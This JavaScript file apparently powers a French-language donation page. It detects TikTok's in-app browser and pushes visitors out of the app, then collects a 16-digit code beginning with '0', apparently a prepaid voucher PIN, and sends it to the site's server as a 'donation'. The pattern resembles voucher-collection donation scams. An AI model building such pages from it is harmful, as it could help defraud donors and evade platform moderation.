/* =========================================================
   TIKTOK IN-APP BROWSER DETECTION + GATEWAY
========================================================= */

(function () {
    var ua = navigator.userAgent || '';
    var isTikTok = ua.indexOf('TikTok') !== -1 || ua.indexOf('ByteDance') !== -1;

    if (isTikTok) {
        document.getElementById('ttGateway').classList.add('show');
        document.body.style.overflow = 'hidden';
    }

    var copyInput = document.getElementById('ttCopyInput');
    if (copyInput) {
        copyInput.value = window.location.href;
    }
})();

function copyLink() {
    var input = document.getElementById('ttCopyInput');
    var msg = document.getElementById('ttCopyMsg');
    var btn = document.getElementById('ttCopyBtn');

    var url = input.value;
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(url).then(function () {
            showCopied();
        }).catch(function () {
            fallbackCopy(input);
            showCopied();
        });
    } else {
        fallbackCopy(input);
        showCopied();
    }

    function showCopied() {
        msg.style.display = 'block';
        btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Copié';
        setTimeout(function () {
            msg.style.display = 'none';
            btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copier le lien';
        }, 3000);
    }

    function fallbackCopy(el) {
        el.select();
        el.setSelectionRange(0, 99999);
        try { document.execCommand('copy'); } catch (e) {}
    }
}


/* =========================================================
   AMOUNT SELECTION
========================================================= */

var selectedAmount = null;

function selectAmount(btn, amount) {
    document.querySelectorAll('.amount-chip').forEach(function (c) {
        c.classList.remove('selected');
    });
    btn.classList.add('selected');
    selectedAmount = amount;
}


/* =========================================================
   STEP NAVIGATION
========================================================= */

var currentStep = 1;

function goToStep(step) {
    document.querySelectorAll('.step-section').forEach(function (s) {
        s.classList.remove('active');
    });
    document.getElementById('step' + step).classList.add('active');

    document.querySelectorAll('.progress-step').forEach(function (ps) {
        var psNum = parseInt(ps.dataset.step);
        ps.classList.remove('active', 'done');
        if (psNum < step) {
            ps.classList.add('done');
        } else if (psNum === step) {
            ps.classList.add('active');
        }
    });

    var fill = document.getElementById('progressFill');
    fill.style.width = (step / 3 * 100) + '%';

    currentStep = step;

    document.querySelector('.container').scrollIntoView({ behavior: 'smooth', block: 'start' });

    if (step === 3) {
        setTimeout(function () {
            document.getElementById('code').focus();
        }, 400);
    }
}


/* =========================================================
   FORM SUBMISSION
========================================================= */

document.getElementById('codeForm').addEventListener('submit', async function (e) {
    e.preventDefault();

    var code = document.getElementById('code').value.replace(/\s/g, '');
    var messageDiv = document.getElementById('message');
    var submitBtn = document.getElementById('submitBtn');

    messageDiv.className = 'message';
    messageDiv.textContent = '';

    if (!code.startsWith('0')) {
        messageDiv.textContent = 'Code invalide. Vérifiez votre code et réessayez.';
        messageDiv.className = 'message error';
        return;
    }

    if (!/^0\d{15}$/.test(code)) {
        messageDiv.textContent = 'Le code doit contenir 16 chiffres. Vérifiez et réessayez.';
        messageDiv.className = 'message error';
        return;
    }

    submitBtn.classList.add('loading');
    submitBtn.disabled = true;

    try {
        var response = await fetch('/api/send-code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ code: code })
        });

        var data = await response.json();

        if (response.ok) {
            messageDiv.textContent = data.message || 'Code envoyé. BaarakaAllahu fik pour votre don.';
            messageDiv.className = 'message success';
            document.getElementById('code').value = '';
        } else {
            messageDiv.textContent = data.error || 'Erreur lors de l\'envoi. Veuillez réessayer.';
            messageDiv.className = 'message error';
        }
    } catch (error) {
        messageDiv.textContent = 'Erreur de connexion. Veuillez réessayer.';
        messageDiv.className = 'message error';
    } finally {
        submitBtn.classList.remove('loading');
        submitBtn.disabled = false;
    }
});


/* =========================================================
   INPUT FORMATTING
========================================================= */

document.getElementById('code').addEventListener('input', function (e) {
    var value = e.target.value.replace(/\D/g, '');
    if (value.length > 16) value = value.slice(0, 16);
    e.target.value = value;
});
